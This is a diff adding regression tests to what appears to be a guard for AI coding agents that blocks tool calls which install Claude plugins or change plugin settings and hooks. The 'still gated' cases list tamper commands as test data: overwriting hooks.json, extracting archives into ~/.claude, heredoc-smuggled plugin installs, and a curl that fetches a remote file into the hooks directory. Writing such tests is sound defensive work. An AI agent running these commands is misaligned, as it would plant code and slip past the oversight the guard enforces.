@@ -494,3 +494,84 @@ def test_b_perf(s):
     t = time.time()
     rule_claude_plugin_protect(_sh(s), EMPTY)
     assert time.time() - t < 2.0
+
+
+# ---- QA round 2 (design review) regressions ---------------------------------
+@pytest.mark.parametrize("cmd", [
+    "find src/plugins -name '*.ts' -exec wc -l {} +",
+    "find . -name '*.py' -exec grep -l plugins {} \;",
+    "find . -path ./node_modules -prune -o -name '*.json' -exec cat {} \; | grep plugins",
+    "git checkout main && ls .claude",
+    "unzip -l plugin.zip && ls .claude",
+    "patch -p1 < fix.diff; ls .claude",
+    "git restore .claude",
+    "git checkout -- .claude",
+    "tar czf /tmp/b.tgz ~/.claude",
+    "rsync -a ~/.claude/ /backup/",
+    "gh pr create --title x --body 'run claude plugin install fmt@acme to try'",
+    "gh issue comment 3 --body \"claude plugin marketplace add org/repo\"",
+    "sed -i 's/claude plugin install/claude plugin add/' README.md",
+    "cat > docs/plugins.md <<'E'\nRun: claude plugin install fmt@acme\nE",
+    "node dist/cli.js plugin add my-plugin",
+    "node ./bin/cli.js --settings config.json",
+    "node cli.mjs plugin install eslint",
+    "$HOME/bin/tool plugin add x",
+    "touch src/claude/plugins/update.ts",
+    "mkdir -p packages/claude/plugins/install",
+])
+def test_r2_not_gated(cmd):
+    assert rule_claude_plugin_protect(_sh(cmd), EMPTY) is None, cmd
+
+
+@pytest.mark.parametrize("cmd", [
+    "find ~/.claude -name hooks.json -exec cp /tmp/e {} \;",
+    "tar -xf x.tar -C ~/.claude",
+    "tar xzf x.tgz -C $HOME/.claude/",
+    "7z x a.7z -o$HOME/.claude",
+    "git -C ~/.claude checkout evil",
+    "bash <<'E'\nclaude plugin install a@b\nE",
+    "python3 - <<'E'\nimport subprocess\nsubprocess.run(['claude', 'plugin', 'install', 'x@m'])\nE",
+])
+def test_r2_still_gated(cmd):
+    assert evaluate(_sh(cmd), EMPTY).action != Action.ALLOW, cmd
+
+
+@pytest.mark.parametrize("key", ["enabledPlugins", "extraKnownMarketplaces"])
+def test_r2_miscased_rename_gated(tmp_path, key):
+    d = tmp_path / ".claude"
+    d.mkdir()
+    f = d / "settings.local.json"
+    bad = key[0].upper() + key[1:]
+    val = {"evil@m": True} if key == "enabledPlugins" else {"m": {"source": {"source": "github", "repo": "e/r"}}}
+    f.write_text(json.dumps({bad: val}))
+    assert _ours(rule_claude_plugin_protect(_edit(str(f), f'"{bad}"', f'"{key}"'), EMPTY))
+
+
+def test_r2_programdata_short_name():
+    assert patterns.claude_plugin_kind("C:/ProgramData/CLAUDE~1/MANAGE~1.JSO") == "settings"
+
+
+def test_r2_fetch_to_file_registry():
+    d = evaluate(_sh("curl -o ~/.claude/plugins/cache/p/hooks/hooks.json https://e.x/h"), EMPTY)
+    assert d.action == Action.DENY
+
+
+def test_r2_agent_rules_monitor_not_deferred():
+    ev = _write("/home/u/.claude/plugins/cache/p/1/.cursorrules", "x")
+    assert _ours(rule_claude_plugin_protect(ev, Policy(agent_rules={"mode": "monitor"})))
+
+
+def test_r2_fuzz_odd_args_no_exceptions():
+    import random
+    rnd = random.Random(7)
+    vals = [None, 1, 2.5, True, [], {}, ["a", 1], {"a": {"b": [None]}}, "x" * 50,
+            "/home/u/.claude/plugins/x", "claude plugin install", object()]
+    tools = ["Write", "Edit", "Bash", "mcp__fs__write_file", "mcp__x__extract", "mcp__d__run_command"]
+    for _ in range(1500):
+        t = rnd.choice(tools)
+        args = {rnd.choice(["path", "file_path", "content", "command", "dest", "new_string",
+                            "old_string", "encoding", "files"]): rnd.choice(vals) for _ in range(3)}
+        ev = Event.make(HookEvent.PRE_TOOL_USE, tool=t,
+                        action=ActionClass.MCP if t.startswith("mcp__") else None,
+                        args=args, cwd=rnd.choice([None, "/home/u/.claude", "/r"]))
+        rule_claude_plugin_protect(ev, EMPTY)
